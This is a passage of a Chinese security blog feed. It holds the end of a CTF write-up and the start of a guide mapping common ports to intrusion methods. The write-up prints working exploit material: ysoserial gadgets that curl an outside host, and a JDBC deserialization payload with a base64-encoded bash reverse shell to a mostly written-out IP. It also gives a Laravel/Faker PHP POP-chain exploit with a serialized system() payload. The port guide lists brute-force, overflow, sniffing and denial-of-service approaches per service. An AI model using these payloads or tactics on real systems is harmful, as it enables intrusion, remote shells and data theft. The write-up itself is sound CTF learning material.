class="punctuation">:</span><span class="string">&quot;index.php&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;yso&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;Jdk7u21&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;Jdk7u21&quot;</span><span class="punctuation">,</span><span class="string">&quot;calc&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;CommonsCollections1&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;CommonsCollections1&quot;</span><span class="punctuation">,</span><span class="string">&quot;curl http://129.204.207.xxx:9002/asd&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line"> <span class="attr">&quot;Commonsollections6&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;CommonsCollections6&quot;</span><span class="punctuation">,</span><span class="string">&quot;curl http://129.204.207.xxx:9002/asd&quot;</span><span class="punctuation">]</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>只需要修改yso就行了，即反序列化，这个是伪造MYSQL服务端读文件和java的按序列化两个功能组合在一起使用的，所以我们只需要改yso:</p><ul><li>vps上运行<code>python3 server.py</code></li><li>vps上监听9002端口</li></ul><h3 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h3><p>最终的payload：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;id&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;com.mysql.cj.jdbc.admin.MiniAdmin&quot;</span><span class="punctuation">,</span><span class="string">&quot;jdbc%3amysql%3a//129.204.207.xxx%3a3306/test%3fautoDeserialize%3dtrue%26queryInterceptors%3dcom.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor%26user%3dyso_CommonsCollections6_bash%20-c%20&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMjkuMjA0LjIwNy54eHgvOTAwMiAwPiYxCg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><span class="punctuation">]</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><code>bash -i &gt;&amp; /dev/tcp/129.204.207.114/9002 0&gt;&amp;1</code>通过linux特性略去了特殊字符如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash%20-c%20&#123;echo,YmFzaCAtaSA%25%32%62JiAvZGV2L3RjcC8xMjkuMjA0LjIwNy54eHgvOTAwMiAwPiYxCg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;</span><br></pre></td></tr></table></figure><p>直接反弹<code>shell</code>,得到flag.</p><h2 id="laravel"><a href="#laravel" class="headerlink" title="laravel"></a>laravel</h2><blockquote><p>rce</p></blockquote><h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>首先在app&#x2F;Http&#x2F;Controllers&#x2F;TaskController.php中发现一个存在接受点的dome；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">App</span>\<span class="title class_">Http</span>\<span class="title class_">Controllers</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TaskController</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[‘p‘]))&#123;</span><br><span class="line">   <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[‘p‘]);</span><br><span class="line">  &#125;</span><br><span class="line"> <span class="keyword">return</span> <span class="string">&quot;There is an param names p (get)&quot;</span>;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><ul><li>这里发现我们传入p参数就可以实现反序列化，这和网上的cve思路有点是一样的；既然出题人提供了这个dome，那么就是利用了；</li><li>这里继续寻找可以利用的方法，尤其是要关注析构函数和构造函数的存在；</li><li>还有call函数；</li><li>在vendor&#x2F;symfony&#x2F;routing&#x2F;Loader&#x2F;Configurator&#x2F;ImportConfigurator.php中我们发现可以析构函数和构造函数，如下：</li></ul><p><img src="https://l0ki-town.oss-cn-beijing.aliyuncs.com/l0ki.top/NrKYcV.png" alt="技术图片"></p><ul><li>我在之前也发现了CollectionConfigurator.php中的一个构造和析构，但是那个php中的析构函数中的属性无法被控制，所以就没有选择其作为触发点；</li><li>这里看到析构函数最后调用了$parent属性下的addCollection方法</li><li>但是在这个php文件中，我们看到构造函数中可以去控制我们的$parent属性；</li><li>利用点就从这里开始；</li><li>然后我们全局去搜索一下addCollection方法，</li><li>这里找到了45个方法，但是看起来都没什么用处，</li><li>所以想到了调用对象中的不存在的方法从而可以调用call()魔术方法；</li><li>所以全局搜索call方法；</li><li>这里引用 vendor&#x2F;fzaninotto&#x2F;faker&#x2F;src&#x2F;Faker&#x2F;Generator.php 下的call方法，</li><li>因为我们可以追溯Generator.php 的代码，发现format可以调用一个回调函数；</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$method</span>, <span class="variable">$attributes</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">format</span>(<span class="variable">$method</span>, <span class="variable">$attributes</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">format</span>(<span class="params"><span class="variable">$formatter</span>, <span class="variable">$arguments</span> = <span class="keyword">array</span>(<span class="params"></span>)</span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="variable">$this</span>-&gt;<span class="title function_ invoke__">getFormatter</span>(<span class="variable">$formatter</span>), <span class="variable">$arguments</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>所以我们可以利用这个回调函数来进行调用一些函数，这里跟进getFormatter函数；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFormatter</span>(<span class="params"><span class="variable">$formatter</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$formatter</span>])) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$formatter</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable language_">$this</span>-&gt;providers <span class="keyword">as</span> <span class="variable">$provider</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">method_exists</span>(<span class="variable">$provider</span>, <span class="variable">$formatter</span>)) &#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$formatter</span>] = <span class="keyword">array</span>(<span class="variable">$provider</span>, <span class="variable">$formatter</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;formatters[<span class="variable">$formatter</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">\InvalidArgumentException</span>(<span class="title function_ invoke__">sprintf</span>(‘Unknown formatter <span class="string">&quot;%s&quot;</span>‘, <span class="variable">$formatter</span>));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>这里我们可以看到getFormatter的返回值也是可控的；</li><li>我们如果想要调用回调函数，就需要访问一个对象中没有的属性去触发call方法，</li><li>然后进入format方法，</li><li>format方法中定义了回调的函数，深入getformatter方法，这里让其返回值<code>$this-&gt;formatters</code>为一个数组，键值为system；</li><li>然后键名就为addCollection，这里$formatter追溯一下就是$method;</li><li>然而由于call的特性，导致我们触发call的时候call的$method默认就是addCollection，</li><li>所以这里就可以直接调用了system方法</li><li>至于参数，因为当初调用了call方法，由于call方法的特性，这里参数默认为$this-&gt;route即$attributes；</li><li>所以对于参数而言，我们只需要输入我们的命令即可。</li></ul><h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><p>开始构造exp；</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Symfony</span>\<span class="title class_">Component</span>\<span class="title class_">Routing</span>\<span class="title class_">Loader</span>\<span class="title class_">Configurator</span>&#123;</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">ImportConfigurator</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">parent</span>;  <span class="comment">//php版本为7.1之上的，对于属性类型并不敏感，所以为了方便直接public；</span></span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$route</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$parent</span>,<span class="variable">$route</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="variable">$parent</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;route = <span class="variable">$route</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span>&#123;        //进入<span class="title class_">Generator</span>.<span class="title class_">php</span>中做文章</span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Generator</span>&#123;</span><br><span class="line">        <span class="title class_">public</span> $<span class="title class_">providers</span> = <span class="title class_">array</span>();    <span class="comment">//截取原来的部分代码，出题人早已经计划好了，已经定义了数组类型；</span></span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$formatters</span> = <span class="keyword">array</span>();</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;formatters = <span class="keyword">array</span>(<span class="string">&quot;addCollection&quot;</span>=&gt;<span class="string">&quot;system&quot;</span>);  <span class="comment">//赋值为此以为最后需要通过析构函数addCollection这个来指向键值调用system；所以直接让addCollection为键名；</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span>&#123;</span><br><span class="line">    $<span class="title class_">s1mple</span> = <span class="title class_">new</span> <span class="title class_">Symfony</span>\<span class="title class_">Component</span>\<span class="title class_">Routing</span>\<span class="title class_">Loader</span>\<span class="title class_">Configurator</span>\<span class="title class_">ImportConfigurator</span>(<span class="title class_">new</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>(),&quot;<span class="title class_">cat</span> /<span class="title class_">flag</span>&quot;);<span class="comment">//利用构造函数赋值；</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$s1mple</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><strong>payload:</strong></p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?p=O<span class="punctuation">:</span><span class="number">64</span><span class="punctuation">:</span><span class="attr">&quot;Symfony\Component\Routing\Loader\Configurator\ImportConfigurator&quot;</span><span class="punctuation">:</span><span class="number">2</span><span class="punctuation">:</span><span class="punctuation">&#123;</span>s<span class="punctuation">:</span><span class="number">6</span><span class="punctuation">:</span><span class="string">&quot;parent&quot;</span>;O<span class="punctuation">:</span><span class="number">15</span><span class="punctuation">:</span><span class="attr">&quot;Faker\Generator&quot;</span><span class="punctuation">:</span><span class="number">2</span><span class="punctuation">:</span><span class="punctuation">&#123;</span>s<span class="punctuation">:</span><span class="number">9</span><span class="punctuation">:</span><span class="string">&quot;providers&quot;</span>;a<span class="punctuation">:</span><span class="number">0</span><span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="punctuation">&#125;</span>s<span class="punctuation">:</span><span class="number">10</span><span class="punctuation">:</span><span class="string">&quot;formatters&quot;</span>;a<span class="punctuation">:</span><span class="number">1</span><span class="punctuation">:</span><span class="punctuation">&#123;</span>s<span class="punctuation">:</span><span class="number">13</span><span class="punctuation">:</span><span class="string">&quot;addCollection&quot;</span>;s<span class="punctuation">:</span><span class="number">6</span><span class="punctuation">:</span><span class="string">&quot;system&quot;</span>;<span class="punctuation">&#125;</span><span class="punctuation">&#125;</span>s<span class="punctuation">:</span><span class="number">5</span><span class="punctuation">:</span><span class="string">&quot;route&quot;</span>;s<span class="punctuation">:</span><span class="number">9</span><span class="punctuation">:</span><span class="string">&quot;cat /flag&quot;</span>;<span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p><strong>Nu1lEXP:</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Symfony</span>\<span class="title class_">Component</span>\<span class="title class_">Routing</span>\<span class="title class_">Loader</span>\<span class="title class_">Configurator</span> &#123;    <span class="title class_">class</span> <span class="title class_">ImportConfigurator</span> &#123;        </span><br><span class="line">    <span class="title class_">private</span> $<span class="title class_">parent</span>;        </span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$route</span>;        </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$parent</span></span>) </span>&#123;            </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="built_in">parent</span> = <span class="variable">$parent</span>;            </span><br><span class="line">        <span class="variable language_">$this</span>-&gt;route = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">        &#125;        </span><br><span class="line"> &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title class_">Faker</span> &#123;    </span><br><span class="line">    <span class="title class_">class</span> <span class="title class_">Generator</span> &#123;        </span><br><span class="line">        <span class="title class_">protected</span> $<span class="title class_">formatters</span> = <span class="title class_">array</span>();</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$formatters</span></span>)</span>&#123;                <span class="variable language_">$this</span>-&gt;formatters = <span class="variable">$formatters</span>;        </span><br><span class="line">&#125;    </span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;    </span><br><span class="line">    $<span class="title class_">a</span> = <span class="title class_">new</span> <span class="title class_">Faker</span>\<span class="title class_">Generator</span>(<span class="title class_">array</span>(&quot;<span class="title class_">addCollection</span>&quot; =&gt; &quot;<span class="title class_">system</span>&quot;));     <span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Symfony\Component\Routing\Loader\Configurator\ImportConfigurator</span>(<span class="variable">$a</span>);        </span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>)); </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Common Ports, Corresponding Services, and Intrusion Approaches</title>
      <link href="/2020/06/16/Common-Ports-Services-and-Intrusion-Approaches/"/>
      <url>/2020/06/16/Common-Ports-Services-and-Intrusion-Approaches/</url>
      
        <content type="html"><![CDATA[<h2 id="0x01-端口服务及利用简析"><a href="#0x01-端口服务及利用简析" class="headerlink" title="0x01 端口服务及利用简析"></a>0x01 端口服务及利用简析</h2><h3 id="1-1-文件共享服务端口"><a href="#1-1-文件共享服务端口" class="headerlink" title="1.1 文件共享服务端口"></a>1.1 文件共享服务端口</h3><table><thead><tr><th>端口号</th><th>端口说明</th><th>利用方向</th></tr></thead><tbody><tr><td>21&#x2F;22&#x2F;69</td><td>FTP&#x2F;TFTP文件传输协议</td><td>允许匿名上传、下载、爆破和嗅探</td></tr><tr><td>2049</td><td>NFS服务</td><td>配置不当</td></tr><tr><td>139</td><td>Samba</td><td>爆破、未授权访问、远程代码执行</td></tr><tr><td>389</td><td>LDAP目录访问协议</td><td>注入、允许匿名访问、弱口令</td></tr></tbody></table><h3 id="1-2-远程连接服务端口"><a href="#1-2-远程连接服务端口" class="headerlink" title="1.2 远程连接服务端口"></a>1.2 远程连接服务端口</h3><table><thead><tr><th>端口号</th><th>端口说明</th><th>利用方向</th></tr></thead><tbody><tr><td>21</td><td>SSH远程连接</td><td>爆破、SSH隧道及内网代理转发、文件传输</td></tr><tr><td>23</td><td>Telnet</td><td>爆破、嗅探、弱口令</td></tr><tr><td>3389</td><td>RDP远程桌面连接</td><td>Shift后门（Windows Server 2003以下版本）、爆破</td></tr><tr><td>5900</td><td>VNC</td><td>弱口令爆破</td></tr><tr><td>5632</td><td>PyAnyWhere服务</td><td>抓代码、代码执行</td></tr></tbody></table><h3 id="1-3-Web应用服务端口"><a href="#1-3-Web应用服务端口" class="headerlink" title="1.3 Web应用服务端口"></a>1.3 Web应用服务端口</h3><table><thead><tr><th>端口号</th><th>端口说明</th><th>利用方向</th></tr></thead><tbody><tr><td>80&#x2F;443&#x2F;8080</td><td>常见Web服务端口</td><td>Web攻击、爆破、对应服务版本漏洞</td></tr><tr><td>7001&#x2F;7002</td><td>Weblogic控制台</td><td>Java 反序列化、弱口令</td></tr><tr><td>8080&#x2F;8089</td><td>Jboos&#x2F;Resin&#x2F;Jetty&#x2F;Jenkins</td><td>反序列化、控制台弱口令</td></tr><tr><td>9090</td><td>WebSphere控制台</td><td>Java 反序列化、弱口令</td></tr><tr><td>4848</td><td>GlassFish控制台</td><td>弱口令</td></tr><tr><td>1352</td><td>Lotus dominion邮件服务</td><td>弱口令、信息泄露、爆破</td></tr><tr><td>10000</td><td>Webmin-Web控制面板</td><td>弱口令</td></tr></tbody></table><h3 id="1-4-数据库端口服务"><a href="#1-4-数据库端口服务" class="headerlink" title="1.4 数据库端口服务"></a>1.4 数据库端口服务</h3><table><thead><tr><th>端口号</th><th>端口说明</th><th>利用方向</th></tr></thead><tbody><tr><td>3306</td><td>MySQL</td><td>注入、提权、爆破</td></tr><tr><td>1433</td><td>MSSQL</td><td>注入、提权、SAP弱口令、爆破</td></tr><tr><td>1521</td><td>Oracle</td><td>TNS爆破、注入、反弹Shell</td></tr><tr><td>5432</td><td>PostgreSQL</td><td>爆破、注入、弱口令</td></tr><tr><td>27017&#x2F;27018</td><td>MongoDB</td><td>爆破、未授权访问</td></tr><tr><td>6379</td><td>Redis</td><td>未授权访问、弱口令爆破</td></tr><tr><td>5000</td><td>SysBase&#x2F;DB2</td><td>爆破、注入</td></tr></tbody></table><h3 id="1-5-邮件服务端口"><a href="#1-5-邮件服务端口" class="headerlink" title="1.5 邮件服务端口"></a>1.5 邮件服务端口</h3><table><thead><tr><th><strong>端口号</strong></th><th><strong>端口说明</strong></th><th><strong>利用方向</strong></th></tr></thead><tbody><tr><td>25</td><td>SMTP 邮件服务</td><td>邮件伪造</td></tr><tr><td>110</td><td>POP3</td><td>爆破、嗅探</td></tr><tr><td>143</td><td>IMAP</td><td>爆破</td></tr></tbody></table><h3 id="1-6-网络常见协议端口"><a href="#1-6-网络常见协议端口" class="headerlink" title="1.6 网络常见协议端口"></a>1.6 网络常见协议端口</h3><table><thead><tr><th>端口号</th><th>端口说明</th><th>利用方向</th></tr></thead><tbody><tr><td>53</td><td>DNS域名系统</td><td>允许区域传送、DNS劫持、缓存投毒、欺骗</td></tr><tr><td>67&#x2F;68</td><td>DHCP服务</td><td>劫持、欺骗</td></tr><tr><td>161</td><td>SNMP协议</td><td>爆破、搜集目标内网信息</td></tr></tbody></table><h3 id="1-7-特殊服务端口"><a href="#1-7-特殊服务端口" class="headerlink" title="1.7 特殊服务端口"></a>1.7 特殊服务端口</h3><table><thead><tr><th align="left">端口号</th><th align="left">端口说明</th><th align="left">利用方向</th></tr></thead><tbody><tr><td align="left">2128</td><td align="left">Zookeeper 服务</td><td align="left">未授权访问</td></tr><tr><td align="left">8068</td><td align="left">Zabbix 服务</td><td align="left">远程执行、SQL注入</td></tr><tr><td align="left">9200&#x2F;9300</td><td align="left">Elasticsearch 服务</td><td align="left">远程执行</td></tr><tr><td align="left">11211</td><td align="left">Memcache 服务</td><td align="left">未授权访问</td></tr><tr><td align="left">512&#x2F;513&#x2F;514</td><td align="left">Linux Rexec 服务</td><td align="left">爆破、Rlogin登陆</td></tr><tr><td align="left">873</td><td align="left">Rsync 服务</td><td align="left">匿名访问、文件上传</td></tr><tr><td align="left">3690</td><td align="left">Svn 服务</td><td align="left">Svn泄露、未授权访问</td></tr><tr><td align="left">50000</td><td align="left">SAP Management Console</td><td align="left">远程执行</td></tr></tbody></table><h2 id="0x02-端口入侵姿势详情"><a href="#0x02-端口入侵姿势详情" class="headerlink" title="0x02 端口入侵姿势详情"></a>0x02 端口入侵姿势详情</h2><h3 id="2-1-21端口入侵"><a href="#2-1-21端口入侵" class="headerlink" title="2.1 21端口入侵"></a>2.1 21端口入侵</h3><p><strong>简介</strong></p><blockquote><p>FTP通常用作对远程服务器进行管理，典型应用就是对web系统进行管理。</p><p>一旦FTP密码泄露就直接威胁web系统安全，甚至黑客通过提权可以直接控制服务器。</p></blockquote><p><strong>姿势</strong></p><p>这里以Serv_uFTP服务器为例，剖析渗透FTP服务器的几种方法:</p><ul><li>（1）对Serv_u5.004以及以下版本可直接使用溢出程序进行远程溢出，成功后可直接得到系统权限。使用Metloit渗透工具包进行溢出。这个工具是需要安装的。</li><li>（2）暴力破解FTP密码，关键是字典的制作。一般用的破解工具是X-way。</li><li>（3）读取Serv_u用户配置文件，并破解用户加密密码。一般使用webshell进行读取。</li><li>（4）通过本地提权工具，可执行任意系统命令。</li><li>（5）使用嗅探方式截取FTP密码，使用工具Cain进行渗透。</li></ul><h3 id="2-2-23端口入侵"><a href="#2-2-23端口入侵" class="headerlink" title="2.2 23端口入侵"></a>2.2 23端口入侵</h3><p><strong>简介</strong></p><blockquote><p>telnet是一种旧的远程管理方式</p><p>使用telnet工具登录系统过程中，网络上传输的用户和密码都是以明文方式传送的</p><p>黑客可使用嗅探技术截获到此类密码。</p></blockquote><p><strong>姿势</strong></p><ul><li>（1）暴力破解技术是常用的技术，使用X-SCAN扫描器对其进行破解。</li><li>（2）在linux系统中一般采用SSH进行远程访问，传输的敏感数据都是经过加密的。而对于windows下的telnet来说是脆弱的，因为默认没有经过任何加密就在网络中进行传输。使用cain等嗅探工具可轻松截获远程登录密码。</li></ul><h3 id="2-3-53端口入侵"><a href="#2-3-53端口入侵" class="headerlink" title="2.3 53端口入侵"></a>2.3 53端口入侵</h3><p><strong>简介</strong></p><blockquote><p>53端口是DNS域名服务器的通信端口</p><p>通常用于域名解析</p><p>也是网络中非常关键的服务器之一</p><p>这类服务器容易受到攻击</p></blockquote><p><strong>姿势</strong></p><ul><li>（1）使用DNS远程溢出漏洞直接对其主机进行溢出攻击，成功后可直接获得系统权限。</li><li>（2）使用DNS欺骗攻击，可对DNS域名服务器进行欺骗，如果黑客再配合网页木马进行挂马攻击，无疑是一种杀伤力很强的攻击，黑客可不费吹灰之力就控制内网的大部分主机。这也是内网渗透惯用的技法之一。</li><li>（3）拒绝服务攻击，利用拒绝服务攻击可快速的导致目标服务器运行缓慢，甚至网络瘫痪。如果使用拒绝服务攻击其DNS服务器。将导致用该服务器进行域名解析的用户无法正常上网。</li></ul><h3 id="2-4-80端口入侵"><a href="#2-4-80端口入侵" class="headerlink" title="2.4 80端口入侵"></a>2.4 80端口入侵</h3><p><strong>简介</strong></p><blockquote><p>通常提供web服务</p><p>目前黑客对80端口的攻击典型是采用 SQL 注入的攻击方法</p><p>脚本渗透技术也是一项综合性极高的web渗透技术</p><p>同时脚本渗透技术对80端口也构成严重的威胁</p></blockquote><p><strong>姿势</strong></p><ul><li>（1）对于windows2000的IIS5.0版本，黑客使用远程溢出直接对远程主机进行溢出攻击，成功后直接获得系统权限。</li><li>（2）对于windows2000中IIS5.0版本，黑客也尝试利用‘Microsoft IISCGI’文件名错误解码漏洞攻击。使用X-SCAN可直接探测到IIS漏洞。</li><li>（3）IIS写权限漏洞是由于IIS配置不当造成的安全问题，攻击者可向存在此类漏洞的服务器上传恶意代码，比如上传脚本木马扩大控制权限。</li><li>（4）普通的http封包是没有经过加密就在网络中传输的，这样就可通过嗅探类工具截取到敏感的数据。如使用Cain工具完成此类渗透。</li><li>（5）80端口的攻击，更多的是采用脚本渗透技术，利用web应用程序的漏洞进行渗透是目前很流行的攻击方式。</li><li>（6）对于渗透只开放80端口的服务器来说，难度很大。利用端口复用工具可解决此类技术难题。</li><li>（7）CC攻击效果不及DDOS效果明显，但是对于攻击一些小型web站点还是比较有用的。CC攻击可使目标站点运行缓慢，页面无法打开，有时还会爆出web程序的绝对路径。</li></ul><h3 id="2-5-135端口入侵"><a href="#2-5-135端口入侵" class="headerlink" title="2.5 135端口入侵"></a>2.5 135端口入侵</h3><p><strong>简介</strong></p><blockquote><p>135端口主要用于使用RPC协议并提供DCOM服务</p><p>通过RPC可以保证在一台计算机上运行的程序可以顺利地执行远程计算机上的代码</p><p>使用DCOM可以通过网络直接进行通信</p><p>能够跨包括HTTP协议在内的多种网络传输</p><p>同时这个端口最严重的就是缓冲区溢出漏洞</p><p>曾经疯狂一时的‘冲击波病毒就是利用这个漏洞进行传播的。</p></blockquote><p><strong>姿势</strong></p><ul><li>（1）查找存在RPC溢出的主机，进行远程溢出攻击，直接获得系统权限。如用‘DSScan’扫描存在此漏洞的主机。对存在漏洞的主机可使用‘ms05011.exe’进行溢出，溢出成功后获得系统权限。</li><li>（2）扫描存在弱口令的135主机，利用RPC远程过程调用开启telnet服务并登录telnet执行系统命令。系统弱口令的扫描一般使用X-SCAN和SHCAN。对于telnet服务的开启可使用工具Recton。</li></ul><h3 id="2-6-139-445端口入侵"><a href="#2-6-139-445端口入侵" class="headerlink" title="2.6 139&#x2F;445端口入侵"></a>2.6 139&#x2F;445端口入侵</h3><p><strong>简介</strong></p><blockquote><p>139端口是为‘NetBIOS 